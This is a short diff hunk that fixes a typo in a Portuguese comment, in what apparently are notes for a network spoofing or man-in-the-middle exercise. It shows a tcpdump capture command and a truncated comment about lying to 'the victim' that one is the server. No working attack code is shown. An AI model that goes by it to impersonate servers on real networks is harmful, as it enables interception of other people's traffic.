@@ -1,4 +1,4 @@
-/*ve se o ping ta chegando*/
+/*ver se o ping ta chegando*/
 tcpdump -i eth0 host 192.168.0.126 
 
 /*aqui mente para a vitima que vc é o servidor
